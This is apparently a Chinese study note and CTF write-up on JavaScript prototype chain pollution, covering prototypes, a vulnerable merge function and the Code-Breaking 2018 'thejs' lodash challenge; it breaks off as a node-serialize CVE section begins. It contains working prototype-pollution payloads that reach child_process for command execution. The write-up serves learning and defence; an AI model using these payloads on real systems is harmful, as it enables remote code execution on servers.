<h1 id="0x04-深入理解-javascript-prototype-污染攻击">0x04 深入理解 JavaScript Prototype 污染攻击</h1>
<h2 id="41-prototype和__proto__分别是什么">4.1 <code>prototype</code>和<code>__proto__</code>分别是什么</h2>
<p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span>
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()</code></pre>
<p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p>
<blockquote>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>
</blockquote>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)
    }
}

(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()).<span class="hljs-title function_">show</span>()</code></pre>
<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span>
}

<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)
}

<span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()
foo.<span class="hljs-title function_">show</span>()</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></p>
<p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<pre><code class="hljs js">foo.<span class="hljs-property">__proto__</span> == <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p>
<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h2 id="42-javascript原型链继承">4.2 JavaScript原型链继承</h2>
<p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">'Donald'</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">'Trump'</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">'Melania'</span>
}

<span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()

<span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${son.first_name}</span> <span class="hljs-subst">${son.last_name}</span>`</span>)</code></pre>
<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<h2 id="43-原型链污染是什么">4.3 原型链污染是什么</h2>
<p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<p>做个简单的实验：</p>
<pre><code class="hljs js"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span>
<span class="hljs-keyword">let</span> foo = {<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>}

<span class="hljs-comment">// foo.bar 此时为1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)

<span class="hljs-comment">// 修改foo的原型（即Object）</span>
foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span>

<span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)

<span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span>
<span class="hljs-keyword">let</span> zoo = {}

<span class="hljs-comment">// 查看zoo.bar</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)</code></pre>
<p>最后，虽然zoo是一个<strong>空</strong>对象<code>{}</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p>
<p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = {}</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<h2 id="44-哪些情况下原型链会被污染">4.4 哪些情况下原型链会被污染</h2>
<p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找到能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge–合并</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) {
        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) {
            <span class="hljs-title function_">merge</span>(target[key], source[key])
        } <span class="hljs-keyword">else</span> {
            target[key] = source[key]
        }
    }
}</code></pre>
<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> o1 = {}
<span class="hljs-keyword">let</span> o2 = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"__proto__"</span>: {<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>}}
<span class="hljs-title function_">merge</span>(o1, o2)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)

o3 = {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)</code></pre>
<p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = {a: 1, "__proto__": {b: 2}}</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> o1 = {}
<span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{"a": 1, "__proto__": {"b": 2}}'</span>)
<span class="hljs-title function_">merge</span>(o1, o2)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)

o3 = {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)</code></pre>
<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p>
<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h2 id="45-code-breaking-2018-thejs-分析">4.5 Code-Breaking 2018 Thejs 分析</h2>
<p>下面是p神出的题目，这里我也只是清楚了漏洞利用点，至于payload暂时不理解。。。</p>
<p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p>
<pre><code class="hljs js"><span class="hljs-comment">// ...</span>
<span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>)
<span class="hljs-comment">// ...</span>

app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">'ejs'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) { 
<span class="hljs-comment">// define the template engine</span>
    fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err))
        <span class="hljs-keyword">let</span> compiled = lodash.<span class="hljs-title function_">template</span>(content)
        <span class="hljs-keyword">let</span> rendered = <span class="hljs-title function_">compiled</span>({...options})

        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, rendered)
    })
})
<span class="hljs-comment">//...</span>

app.<span class="hljs-title function_">all</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    <span class="hljs-keyword">let</span> data = req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> || {<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []}
    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">'POST'</span>) {
        data = lodash.<span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)
        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data
    }

    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">'index'</span>, {
        <span class="hljs-attr">language</span>: data.<span class="hljs-property">language</span>, 
        <span class="hljs-attr">category</span>: data.<span class="hljs-property">category</span>
    })
})</code></pre>
<p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p>
<ol>
<li><code>lodash.template</code> 一个简单的模板引擎</li>
<li><code>lodash.merge</code> 函数或对象的合并</li>
</ol>
<p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p>
<p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p>
<p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
<pre><code class="hljs js"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span>
<span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">'sourceURL'</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">'//# sourceURL='</span> + options.<span class="hljs-property">sourceURL</span> + <span class="hljs-string">'\n'</span> : <span class="hljs-string">''</span>;
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">'return '</span> + source)
  .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);
});</code></pre>
<p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p>
<p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p>
<p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p>
<p>可见，我们代码执行成功，返回了id命令的结果。</p>
<h2 id="46-tips">4.6 Tips</h2>
<p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p>
<ul>
<li>在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</li>
</ul>
<p>例子：</p>
<pre><code class="hljs js">object.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span>=value</code></pre>
<ul>
<li>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</li>
</ul>
<pre><code class="hljs js">objectname[<span class="hljs-string">"__proto__"</span>]
objectname.<span class="hljs-property">__proto__</span>
objectname.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<ul>
<li>不同对象所生成的原型链如下(部分)：</li>
</ul>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> o = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>};
<span class="hljs-comment">// o对象直接继承了Object.prototype</span>
<span class="hljs-comment">// 原型链：</span>
<span class="hljs-comment">// o ---&gt; Object.prototype ---&gt; null</span>

<span class="hljs-keyword">var</span> a = [<span class="hljs-string">"yo"</span>, <span class="hljs-string">"whadup"</span>, <span class="hljs-string">"?"</span>];
<span class="hljs-comment">// 数组都继承于 Array.prototype</span>
<span class="hljs-comment">// 原型链：</span>
<span class="hljs-comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>){
  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
}
<span class="hljs-comment">// 函数都继承于 Function.prototype</span>
<span class="hljs-comment">// 原型链：</span>
<span class="hljs-comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></code></pre>
<h1 id="0x05-进一步理解-简化版">0x05 进一步理解-简化版</h1>
<h2 id="51-原型链污染原理">5.1 原型链污染原理</h2>
<p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p>
<p>来看一个简单的例子：</p>
<pre><code class="hljs plaintext">object1 = {"a":1, "b":2};
object1.__proto__.foo = "Hello World";
console.log(object1.foo);
object2 = {"c":1, "d":2};
console.log(object2.foo);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030190629976.png" alt="image-20231030190629976"></p>
<p>​		最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p>
<h2 id="52-code-breaking-2018-thejs">5.2 Code-Breaking 2018 Thejs</h2>
<p>这回再跟着先知社区的佬过一遍</p>
<p>题目源码下载：<a target="_blank" rel="noopener" href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p>
<p>直接npm install可以把需要的模块下载下来。</p>
<p>server.js</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>)
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>)
<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'body-parser'</span>)
<span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>)
<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express-session'</span>)
<span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">'randomatic'</span>)

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()
app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>({<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>})).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'/static'</span>, express.<span class="hljs-title function_">static</span>(<span class="hljs-string">'static'</span>))
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'thejs.session'</span>,
    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">'aA0'</span>, <span class="hljs-number">16</span>),
    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>
}))

app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">'ejs'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) { <span class="hljs-comment">// define the template engine</span>
    fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err))
        <span class="hljs-keyword">let</span> compiled = lodash.<span class="hljs-title function_">template</span>(content)
        <span class="hljs-keyword">let</span> rendered = <span class="hljs-title function_">compiled</span>({...options})
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, rendered)
    })
})
app.<span class="hljs-title function_">set</span>(<span class="hljs-string">'views'</span>, <span class="hljs-string">'./views'</span>)
app.<span class="hljs-title function_">set</span>(<span class="hljs-string">'view engine'</span>, <span class="hljs-string">'ejs'</span>)

app.<span class="hljs-title function_">all</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    <span class="hljs-comment">// 定义session</span>
    <span class="hljs-keyword">let</span> data = req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> || {<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []}
    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">'POST'</span>) {
        <span class="hljs-comment">// 获取post数据并合并</span>
        data = lodash.<span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)
        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data
        <span class="hljs-comment">// 再将data赋值给session</span>
    }
    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">'index'</span>, {
        <span class="hljs-attr">language</span>: data.<span class="hljs-property">language</span>, 
        <span class="hljs-attr">category</span>: data.<span class="hljs-property">category</span>
    })
})

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Example app listening on port 3000!'</span>))</code></pre>
<p>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p>
<p>页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030190941582.png" alt="image-20231030190941582"></p>
<p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">'sourceURL'</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">'//# sourceURL='</span> + options.<span class="hljs-property">sourceURL</span> + <span class="hljs-string">'\n'</span> : <span class="hljs-string">''</span>;</code></pre>
<p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p>
<p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030191055545.png" alt="image-20231030191055545"></p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">'return '</span> + source)
      .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);
  });</code></pre>
<p>通过构造chile_process.exec()就可以执行任意代码了。</p>
<p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p>
<pre><code class="hljs js">{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"sourceURL"</span>:<span class="hljs-string">"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"</span>}}</code></pre>
<p>(这里直接用require会报错：ReferenceError: require is not defined</p>
<p>p神给了一个更好的payload：</p>
<pre><code class="hljs js">{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"sourceURL"</span>:<span class="hljs-string">"\nreturn e=&gt; {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')}\n//"</span>}}</code></pre>
<p>下面跟着佬过一遍CVE漏洞，有时间下去复现。</p>
<h2 id="53-node-serialize反序列化rce漏洞cve-2017-5941">5.3 node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2>
<p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p>
<ul>
<li>了解什么是IIFE：</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
<p>IIFE一般写成下面的形式：</p>
<pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){ <span class="hljs-comment">/* code */</span> }());
<span class="hljs-comment">// 或者</span>
(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){ <span class="hljs-comment">/* code */</span> })();</code></pre>
<ul>
<li><code>node-serialize@0.0.4</code>漏洞点</li>
</ul>
<p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
